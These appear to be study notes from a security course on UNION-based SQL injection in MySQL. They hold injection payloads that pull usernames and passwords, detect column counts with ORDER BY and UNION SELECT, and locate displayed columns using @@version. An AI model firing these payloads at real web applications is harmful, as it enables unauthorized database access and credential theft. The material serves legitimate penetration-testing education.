The [Union](https://dev.mysql.com/doc/refman/8.0/en/union.html) clause is used to combine results from multiple `SELECT` statements.

```shell-session
mysql> SELECT * FROM ports;

+----------+-----------+
| code     | city      |
+----------+-----------+
| CN SHA   | Shanghai  |
| SG SIN   | Singapore |
| ZZ-21    | Shenzhen  |
+----------+-----------+
3 rows in set (0.00 sec)
```

```shell-session
mysql> SELECT * FROM ships;

+----------+-----------+
| Ship     | city      |
+----------+-----------+
| Morrison | New York  |
+----------+-----------+
1 rows in set (0.00 sec)
```

## UNION

```shell
mysql> SELECT * FROM ports UNION SELECT * FROM ships;

+----------+-----------+
| code     | city      |
+----------+-----------+
| CN SHA   | Shanghai  |
| SG SIN   | Singapore |
| Morrison | New York  |
| ZZ-21    | Shenzhen  |
+----------+-----------+
4 rows in set (0.00 sec)
```

```sql
SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '
```

The above query would return `username` and `password` entries from the `passwords` table, assuming the `products` table has two columns.

## Uneven Columns
When using a **`UNION SELECT`** injection, your goal is to **merge your custom query with the original query**. For it to work properly:

ðŸ‘‰ The number of columns **must match** between both queries.
If not, SQL will throw an error like:

`ERROR: The used SELECT statements have a different number of columns`


EXAMPLE

```sql 

ORIGINA: SELECT * FROM products WHERE product_id = '1'


INJECT: ' UNION SELECT username FROM users-- 


QUERY: SELECT * FROM products WHERE product_id = '1' UNION SELECT username FROM users


FAILS: The original query returns 2 columns.
		Your injected query returns only 1 column (`username`).

âœ… The Fix: Padding with Junk Values

' UNION SELECT username, 123 FROM users--


```
`username` goes in column 1
`123` (junk value) fills column 2

Q : Connect to the above MySQL server with the 'mysql' tool, and find the number of records returned when doing a 'Union' of all records in the 'employees' table and all records in the 'departments' table.

```sql
SELECT COUNT(*) AS total, 'departments' AS source FROM departments
UNION
SELECT COUNT(*) AS total, 'employees' AS source FROM employees;
```

## Detect number of columns
- Using `ORDER BY`
- Using `UNION`

#### Using ORDER BY

```sql
' order by 1-- -
```

If no error, proceed to:

```sql
' ORDER BY 2-- -

```

and so forth...

When you get an error, say on `ORDER BY 5`, it means only columns 1 to 4 exist â†’ **4 columns total**.


#### Using UNION SELECT

Try to inject a `UNION SELECT` with increasing numbers of columns.
```sql
' UNION SELECT 1-- -


' UNION SELECT 1,2-- -


' UNION SELECT 1,2,3-- -


UNTIL SUCESSFULL
```

## Location of Injection

While a query may return multiple columns, the web application may only display some of them. So, if we inject our query in a column that is not printed on the page, we will not get its output. This is why we need to determine which columns are printed to the page, to determine where to place our injection. In the previous example, while the injected query returned 1, 2, 3, and 4, we saw only 2, 3, and 4 displayed back to us on the page as the output data:

It is very common that not every column will be displayed back to the user. For example, the ID field is often used to link different tables together, but the user doesn't need to see it. This tells us that columns 2 and 3, and 4 are printed to place our injection in any of them. `We cannot place our injection at the beginning, or its output will not be printed.`

```sql
cn' UNION select 1,@@version,3,4-- -
```
If you see something like `10.3.22-MariaDB-1ubuntu1` where `2` was, then column 2 **displays data**.

|Step|Purpose|
|---|---|
|Inject numbered payload|Find which columns display output|
|Replace a number with `@@version`|Confirm that column is displayed and can show real data|
|Place your sensitive data in displayed columns|Your injection results will appear on the page|
